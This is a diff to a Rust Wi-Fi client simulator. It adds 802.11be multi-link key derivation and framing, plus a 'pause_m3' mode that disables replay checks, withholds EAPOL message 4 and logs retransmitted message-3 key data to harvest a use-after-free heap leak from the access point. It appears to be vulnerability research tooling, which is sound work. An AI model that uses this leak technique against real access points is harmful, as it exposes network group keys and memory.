@@ -91,6 +91,17 @@ pub struct Client {
     /// Test override: force this WMM user priority (TID 0-7) on all uplink data
     /// instead of deriving it from each packet's DSCP. `None` = derive per packet.
     wmm_tid_override: Option<u8>,
+    /// 802.11be MLD: STA MLD MAC, link-1 MAC, and the AP's MLD MAC. When set, the
+    /// assoc carries a per-STA profile for link 1 and the 4-way derives the PTK
+    /// from the MLD MAC addresses (not the per-link addresses).
+    mld_mac: Option<[u8; 6]>,
+    link1_mac: Option<[u8; 6]>,
+    ap_mld_mac: Option<[u8; 6]>,
+    /// PSK-SHA256 (AKM 00-0F-AC:6): SHA-256 PTK + AES-CMAC v3 MIC (MLO-capable PSK).
+    psk_sha256: bool,
+    /// Pause at EAPOL message 3: decrypt + log each m3 (incl. retransmissions) but
+    /// never send m4, so the AP keeps rebuilding/retransmitting m3 (UAF leak window).
+    pause_m3: bool,
 }
 
 fn random_bytes<const N: usize>() -> [u8; N] {
@@ -142,6 +153,34 @@ impl Client {
             owe_pub: None,
             wmm: true,
             wmm_tid_override: None,
+            mld_mac: None,
+            link1_mac: None,
+            ap_mld_mac: None,
+            psk_sha256: false,
+            pause_m3: false,
+        }
+    }
+
+    /// Enable 2-link MLD: the (re)assoc carries a per-STA profile for link 1, and
+    /// the SAE auth + 4-way derive keys from the MLD MAC addresses. Combine with
+    /// `enable_sae()` (the MLD AP on hwsim is SAE).
+    pub fn enable_mld(&mut self, mld_mac: [u8; 6], link1_mac: [u8; 6], ap_mld_mac: [u8; 6]) {
+        self.mld_mac = Some(mld_mac);
+        self.link1_mac = Some(link1_mac);
+        self.ap_mld_mac = Some(ap_mld_mac);
+    }
+
+    /// Pause at EAPOL message 3 (decrypt + log, never ack) for the m3-retransmit leak.
+    pub fn set_pause_m3(&mut self) {
+        self.pause_m3 = true;
+    }
+
+    /// The EAPOL-Key MIC algorithm for this association's AKM.
+    fn key_mic(&self) -> dot11::KeyMic {
+        if self.psk_sha256 {
+            dot11::KeyMic::AesCmacV3
+        } else {
+            dot11::KeyMic::select(self.sae_pmk.is_some(), self.owe)
         }
     }
 
@@ -289,7 +328,11 @@ impl Client {
                 out.tx(self.with_wmm(dot11::build_assoc_req_owe(&bssid, &self.mac, &ssid, &dh, sc)));
                 return out;
             }
-            out.tx(self.with_wmm(dot11::build_assoc_req(&bssid, &self.mac, &ssid, sc)));
+            if let (Some(mld), Some(l1)) = (self.mld_mac, self.link1_mac) {
+                out.tx(dot11::build_assoc_req_mld(&bssid, &self.mac, &mld, &l1, &ssid, sc));
+            } else {
+                out.tx(self.with_wmm(dot11::build_assoc_req(&bssid, &self.mac, &ssid, sc)));
+            }
             return out;
         }
 
@@ -355,7 +398,20 @@ impl Client {
             if pn <= last {
                 return out; // replayed frame
             }
-            if let Some(eth) = dot11::decrypt_ccmp(&frame, &tk, true) {
+            // 802.11be (MLO) pairwise downlink: the AP CCMP-protects with the
+            // MLD addresses while the header carries link addresses, so decrypt
+            // with the MLD security context (mirroring the uplink translation).
+            // Group (GTK) frames keep their as-sent addresses.
+            let sec = match (use_group, self.mld_mac, self.ap_mld_mac, self.bssid) {
+                (false, Some(mld), Some(ap_mld), Some(bssid)) => {
+                    let sec_a1 = mld; // RA: our link addr -> our MLD
+                    let sec_a2 = ap_mld; // TA: AP link0 BSSID -> AP MLD
+                    let sec_a3 = if frame.addr3 == bssid { ap_mld } else { frame.addr3 };
+                    Some((sec_a1, sec_a2, sec_a3))
+                }
+                _ => None,
+            };
+            if let Some(eth) = dot11::decrypt_ccmp_sec(&frame, &tk, true, sec) {
                 if use_group {
                     self.last_rx_gpn = pn;
                 } else {
@@ -533,14 +589,24 @@ impl Client {
     /// Send our SAE commit to start the exchange (status 126 for H2E, 0 for
     /// hunting-and-pecking).
     fn start_sae(&mut self, bssid: &[u8; 6], out: &mut ClientOut) {
+        // MLD SAE: because the auth frames carry the STA's MLD MAC (multi_link_auth),
+        // the AP derives the SAE PWE/keys from the MLD MAC addresses — so we must too.
+        // The auth frames themselves stay link-addressed.
+        let sae_sta = self.mld_mac.unwrap_or(self.mac);
+        let sae_ap = self.ap_mld_mac.unwrap_or(*bssid);
         let sae = if self.sae_h2e {
-            Some(crate::sae::Sae::new_h2e(&self.ssid, &self.password, None, &self.mac, bssid))
+            Some(crate::sae::Sae::new_h2e(&self.ssid, &self.password, None, &sae_sta, &sae_ap))
         } else {
-            crate::sae::Sae::new_hunting_pecking(&self.password, &self.mac, bssid)
+            crate::sae::Sae::new_hunting_pecking(&self.password, &sae_sta, &sae_ap)
         };
         let Some(mut sae) = sae else { return };
         sae.prepare_commit(None);
-        let commit = sae.write_commit();
+        let mut commit = sae.write_commit();
+        // MLD: carry the STA's MLD MAC in the SAE commit so the AP records it
+        // (the assoc's MLD MAC must match the auth's).
+        if let Some(mld) = self.mld_mac {
+            commit.extend_from_slice(&dot11::multi_link_auth(&mld));
+        }
         let status = if self.sae_h2e { dot11::STATUS_SAE_H2E } else { dot11::STATUS_SUCCESS };
         let sc = self.next_sc();
         out.tx(dot11::build_sae_auth(bssid, &self.mac, bssid, dot11::FC_TODS, sc, 1, status, &commit));
@@ -552,13 +618,16 @@ impl Client {
         match seq {
             1 => {
                 // AP commit -> derive keys, send our confirm
-                let confirm = {
+                let mut confirm = {
                     let Some(sae) = self.sae.as_mut() else { return };
                     if sae.parse_peer_commit(payload).is_err() || sae.process_commit().is_err() {
                         return;
                     }
                     sae.write_confirm()
                 };
+                if let Some(mld) = self.mld_mac {
+                    confirm.extend_from_slice(&dot11::multi_link_auth(&mld));
+                }
                 let Some(bssid) = self.bssid else { return };
                 let sc = self.next_sc();
                 out.tx(dot11::build_sae_auth(&bssid, &self.mac, &bssid, dot11::FC_TODS, sc, 2, dot11::STATUS_SUCCESS, &confirm));
@@ -585,8 +654,13 @@ impl Client {
                 let sc = self.next_sc();
                 let ssid = self.ssid.clone();
                 // SAE associations must advertise the SAE AKM, not WPA2-PSK,
-                // otherwise the AP rejects with "Invalid AKMP".
-                out.tx(self.with_wmm(dot11::build_assoc_req_sae(&bssid, &self.mac, &ssid, sc)));
+                // otherwise the AP rejects with "Invalid AKMP". For MLD, send the
+                // 2-link assoc carrying the per-STA profile.
+                if let (Some(mld), Some(l1)) = (self.mld_mac, self.link1_mac) {
+                    out.tx(dot11::build_assoc_req_mld(&bssid, &self.mac, &mld, &l1, &ssid, sc));
+                } else {
+                    out.tx(self.with_wmm(dot11::build_assoc_req_sae(&bssid, &self.mac, &ssid, sc)));
+                }
             }
             _ => {}
         }
@@ -601,17 +675,19 @@ impl Client {
         self.anonce = ek.key_nonce;
         self.snonce = self.test_snonce.unwrap_or_else(random_bytes::<32>);
 
-        // Use the SAE PMK + SHA-256 key descriptors when present (WPA3), else
-        // the PSK-derived PMK + SHA-1 (WPA2).
-        let sha256 = self.sae_pmk.is_some();
+        // SAE/OWE/PSK-SHA256 use the SHA-256 key hierarchy; plain WPA2-PSK SHA-1.
+        // For MLD the 4-way derives the PTK from the MLD MAC addresses.
+        let sha256 = self.sae_pmk.is_some() || self.psk_sha256;
         let pmk = self.sae_pmk.unwrap_or(self.pmk);
+        let aa = self.ap_mld_mac.unwrap_or(bssid);
+        let spa = self.mld_mac.unwrap_or(self.mac);
         if sha256 {
-            let ptk = crypto::derive_ptk_sha256(&pmk, &bssid, &self.mac, &self.anonce, &self.snonce);
+            let ptk = crypto::derive_ptk_sha256(&pmk, &aa, &spa, &self.anonce, &self.snonce);
             self.kck.copy_from_slice(&ptk[..16]);
             self.kek.copy_from_slice(&ptk[16..32]);
             self.tk.copy_from_slice(&ptk[32..48]);
         } else {
-            let ptk = crypto::custom_prf512(&pmk, &bssid, &self.mac, &self.anonce, &self.snonce);
+            let ptk = crypto::custom_prf512(&pmk, &aa, &spa, &self.anonce, &self.snonce);
             self.kck.copy_from_slice(&ptk[..16]);
             self.kek.copy_from_slice(&ptk[16..32]);
             self.tk.copy_from_slice(&ptk[32..48]);
@@ -622,12 +698,18 @@ impl Client {
         let kck = self.kck;
         let snonce = self.snonce;
         let oci = if self.ocv {
-            Some((dot11::operating_class(self.channel), self.channel))
+            Some((dot11::operating_class(self.channel, 20, false), self.channel)) // 20 MHz STA data plane
         } else {
             None
         };
         // m2 must echo the RSN this STA advertised in its assoc request.
-        let supp_rsn: Vec<u8> = if self.owe {
+        let mut supp_rsn: Vec<u8> = if self.mld_mac.is_some() {
+            let mut r = dot11::AMLD_RSN_SAE.to_vec();
+            r.extend_from_slice(&dot11::RSNXE_H2E);
+            r
+        } else if self.psk_sha256 {
+            dot11::AMLD_RSN_PSK256.to_vec()
+        } else if self.owe {
             dot11::RSN_OWE.to_vec()
         } else if sha256 {
             let mut r = dot11::RSN_WPA3.to_vec();
@@ -636,7 +718,20 @@ impl Client {
         } else {
             dot11::RSN.to_vec()
         };
-        out.tx(dot11::build_eapol_m2(&bssid, &self.mac, &snonce, &kck, &supp_rsn, sc, dot11::KeyMic::select(sha256, self.owe), oci));
+        // MLD: m2 must carry the STA's MLD MAC in a MAC Address KDE (00-0F-AC:3)
+        // plus one MLO Link KDE (00-0F-AC:19) per affiliated link (link 1 here),
+        // else the AP rejects ("Invalid MLD address" / "Expecting N MLD links").
+        if let Some(mld) = self.mld_mac {
+            supp_rsn.extend_from_slice(&[0xdd, 0x0a, 0x00, 0x0f, 0xac, 0x03]);
+            supp_rsn.extend_from_slice(&mld);
+            if let Some(l1) = self.link1_mac {
+                // link info = link_id 1, no RSNE; then the link-1 STA MAC.
+                supp_rsn.extend_from_slice(&[0xdd, 0x0b, 0x00, 0x0f, 0xac, 0x13, 0x01]);
+                supp_rsn.extend_from_slice(&l1);
+            }
+        }
+        let mic = self.key_mic();
+        out.tx(dot11::build_eapol_m2(&bssid, &self.mac, &snonce, &kck, &supp_rsn, sc, mic, oci));
         self.eapol_state = 1;
     }
 
@@ -646,9 +741,9 @@ impl Client {
         let Some(key_body) = m3.eapol_key_body() else { return };
         let Some(ek) = dot11::EapolKey::parse(key_body) else { return };
 
-        // EAPOL-Key replay-counter enforcement: message 3 must use a counter
-        // greater than message 1's. Rejects replayed/forged message 3.
-        if ek.key_replay_counter <= self.eapol_replay {
+        // Replay enforcement — skipped while paused at m3 so each retransmission
+        // (including the post-reclaim UAF leak) is decrypted, not dropped.
+        if !self.pause_m3 && ek.key_replay_counter <= self.eapol_replay {
             return;
         }
 
@@ -661,33 +756,44 @@ impl Client {
         for b in to_check[mic_off..mic_off + 16].iter_mut() {
             *b = 0;
         }
-        let sha256 = self.sae_pmk.is_some();
-        let computed = dot11::KeyMic::select(sha256, self.owe).compute(&self.kck, &to_check).to_vec();
+        let computed = self.key_mic().compute(&self.kck, &to_check).to_vec();
         if !crypto::constant_time_eq(&computed[..16], &ek.key_mic) {
             return; // bad MIC, drop
         }
         self.eapol_replay = ek.key_replay_counter;
 
-        // unwrap and install the GTK by parsing the GTK KDE (the RSN element
-        // that precedes it varies in length: 22 for WPA2, 28+ for SAE/OWE), plus
-        // the IGTK (PMF) and BIGTK (Beacon Protection) when delivered.
+        // unwrap and install the GTK / IGTK / BIGTK from the KEK-wrapped key data.
         if let Some(unwrapped) = crypto::aes_unwrap(&self.kek, &ek.key_data) {
-            // Initial install: don't reset last_rx_gpn (it's already 0 and the
-            // first downlink frame must be accepted).
+            if self.pause_m3 {
+                // The UAF-leaked IGTK (back-indexed heap bytes) rides in here.
+                eprintln!("M3_KEYDATA {}", hex_str(&unwrapped));
+            }
             self.install_group_keys(&unwrapped, false);
-            // Operating Channel Validation: message 3's OCI must match.
             if self.ocv {
-                let want = (dot11::operating_class(self.channel), self.channel);
+                // The AP's OCI carries ITS operating class (e.g. 128 at 80 MHz)
+                // — pin the primary channel + band, not an identical class.
                 match dot11::parse_oci_kde(&unwrapped) {
-                    Some(oci) if oci == want => {}
+                    Some((oc, ch))
+                        if ch == self.channel
+                            && dot11::oci_class_matches_band(oc, self.channel, false) => {}
                     _ => return, // missing or mismatched OCI -> possible MITM, drop
                 }
             }
+        } else if self.pause_m3 {
+            eprintln!("M3_UNWRAP_FAIL kd_len={}", ek.key_data.len());
+        }
+
+        if self.pause_m3 {
+            // Never ack m3: stay at eapol_state=1 so the AP keeps retransmitting it.
+            return;
         }
 
         let sc = self.next_sc();
         let kck = self.kck;
-        out.tx(dot11::build_eapol_m4(&bssid, &self.mac, &kck, sc, dot11::KeyMic::select(sha256, self.owe)));
+        let mic = self.key_mic();
+        // MLD: m4 must carry the STA's MLD MAC (MAC Address KDE), like m2, or the
+        // AP rejects msg 4/4 and never authorizes the port (uplink data dropped).
+        out.tx(dot11::build_eapol_m4_mld(&bssid, &self.mac, &kck, sc, mic, self.mld_mac.as_ref()));
         self.connected = 4;
         // The pairwise key is now installed (m3 verified, m4 sent); only from
         // here may protected unicast management frames be validated with `tk`.
@@ -715,20 +821,39 @@ impl Client {
         } else {
             None
         };
-        eprintln!("DBG uplink wmm={} override={:?} qos_tid={:?} ethertype={ethertype:#06x}", self.wmm, self.wmm_tid_override, qos_tid);
-        let frame = dot11::build_ccmp_data(
-            &bssid,
-            &self.mac,
-            &dst,
-            dot11::FC_TODS | dot11::FC_PROTECTED,
-            sc,
-            pn,
-            0,
-            &tk,
-            ethertype,
-            inner,
-            qos_tid,
-        );
+        // 802.11be (MLO): the MAC header carries the link addresses so the frame
+        // traverses link 0, but the CCMP nonce/AAD (and thus the AP's STA lookup)
+        // must use the MLD addresses — the same basis the PTK was derived from in
+        // the 4-way handshake (`ap_mld_mac` / `mld_mac`). Without this the AP
+        // can't map the frame to the MLD STA and drops it as "not associated".
+        let frame = if let (Some(mld), Some(ap_mld)) = (self.mld_mac, self.ap_mld_mac) {
+            // Map each link address in the header to its MLD counterpart for the
+            // security context (A1=AP, A2=STA, A3=DA — only the AP/STA link
+            // addresses translate; a DA for some other device stays as-is).
+            let sec_a1 = ap_mld; // RA: AP link0 BSSID -> AP MLD
+            let sec_a2 = mld; // TA: STA link0 addr -> STA MLD
+            let sec_a3 = if dst == bssid { ap_mld } else { dst };
+            dot11::build_ccmp_data_sec(
+                &bssid, &self.mac, &dst,
+                &sec_a1, &sec_a2, &sec_a3,
+                dot11::FC_TODS | dot11::FC_PROTECTED,
+                sc, pn, 0, &tk, ethertype, inner, qos_tid,
+            )
+        } else {
+            dot11::build_ccmp_data(
+                &bssid,
+                &self.mac,
+                &dst,
+                dot11::FC_TODS | dot11::FC_PROTECTED,
+                sc,
+                pn,
+                0,
+                &tk,
+                ethertype,
+                inner,
+                qos_tid,
+            )
+        };
         let mut f = dot11::RADIOTAP_TX.to_vec();
         f.extend_from_slice(&frame);
         Some(f)
@@ -834,6 +959,15 @@ impl Client {
         };
         dot11::bip_verify(&igtk, frame.fc0, frame.fc1, &frame.addr1, &frame.addr2, &frame.addr3, &frame.body)
     }
+}
+
+fn hex_str(b: &[u8]) -> String {
+    use std::fmt::Write;
+    let mut s = String::with_capacity(b.len() * 2);
+    for x in b {
+        let _ = write!(s, "{:02x}", x);
+    }
+    s
 }
 
 fn inet_checksum(data: &[u8]) -> u16 {
